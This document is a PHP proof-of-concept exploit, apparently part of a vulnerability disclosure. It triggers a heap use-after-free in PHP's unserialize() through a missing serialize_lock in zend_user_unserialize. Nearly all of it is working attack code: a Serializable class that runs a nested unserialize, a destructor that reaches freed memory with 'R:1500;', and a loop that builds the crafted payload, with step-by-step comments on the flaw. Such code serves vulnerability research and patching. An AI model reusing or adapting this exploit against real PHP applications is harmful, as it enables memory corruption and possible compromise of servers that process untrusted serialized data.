<?php
// Calif MAD Bugs PoC: zend_user_unserialize missing serialize_lock
// Vulnerability: BG(serialize_lock) not incremented around
//   zend_call_method_with_1_params in zend_user_unserialize()
//   (Zend/zend_interfaces.c:450-452)
//
// Flow:
// 1. Outer unserialize() encounters C: format (Serializable)
// 2. object_custom() calls ce->unserialize() → zend_user_unserialize()
//    WITHOUT BG(serialize_lock)++
// 3. Evil::unserialize() calls PHP unserialize() which reuses outer
//    var_hash (php_var_unserialize_init sees lock=0, level>0)
// 4. Inner unserialize() creates Trigger with duplicate key →
//    var_push_dtor_value copies Trigger to shared dtor chain
// 5. Inner completes without var_destroy (level>1)
// 6. Outer completes → var_destroy():
//    - Phase 1: efree all extension chunks (entries.next dangling)
//    - Phase 2: i_zval_ptr_dtor on Trigger dtor entry → __destruct
//    - __destruct → unserialize('R:1500;') → var_access(1500)
//      walks freed entries.next → heap-use-after-free
//
// This is the Calif.io "MAD Bugs" vulnerability entry point.
// DinOSn's var_destroy UAF uses different triggers (L284/L302/L308
// lock-free sites) and is NOT fixed by patching zend_user_unserialize.

class Trigger {
    public function __destruct() {
        fwrite(STDERR, "[Trigger::__destruct] firing\n");
        // Fires during var_destroy Phase 2 (i_zval_ptr_dtor at L308)
        // WITHOUT BG(serialize_lock). unserialize() sees lock=0, level=1
        // → reuses outer var_hash. R:1500 walks freed entries.next → UAF.
        $r = @unserialize('R:1500;');
        fwrite(STDERR, "[Trigger::__destruct] result type=" . gettype($r) . "\n");
    }
}

class Evil implements Serializable {
    public function serialize(): ?string {
        return "";
    }

    public function unserialize(string $data): void {
        fwrite(STDERR, "[Evil::unserialize] called, dispatching inner unserialize\n");
        // Called from zend_user_unserialize() WITHOUT BG(serialize_lock)
        // Inner unserialize() reuses outer var_hash (lock=0, level>0)
        // Create Trigger, then duplicate key pushes old Trigger to dtor chain
        // via var_push_dtor_value (ZVAL_COPY_VALUE, no refcount increment)
        @unserialize('a:2:{i:0;O:7:"Trigger":0:{}i:0;i:42;}');
        fwrite(STDERR, "[Evil::unserialize] inner unserialize returned\n");
    }
}

// Build outer payload:
// - Push 1500+ integer entries to overflow VAR_ENTRIES_MAX (1018)
//   and allocate extension chunks
// - Trigger C: format for Evil::unserialize()
// - Evil injects Trigger into shared dtor chain via inner unserialize
// - var_destroy Phase 1 frees extension chunks, Phase 2 → Trigger __destruct → UAF

$N = 1500;
$entries = '';
for ($i = 0; $i < $N; $i++) {
    $entries .= "i:$i;i:1;";
}

$payload = 'a:' . ($N + 1) . ':{' . $entries . 'i:' . $N . ';C:4:"Evil":1:{x}}';

fwrite(STDERR, "[main] outer unserialize (payload " . strlen($payload) . " bytes)\n");
$r = @unserialize($payload);
fwrite(STDERR, "[main] done\n");
$r = null;
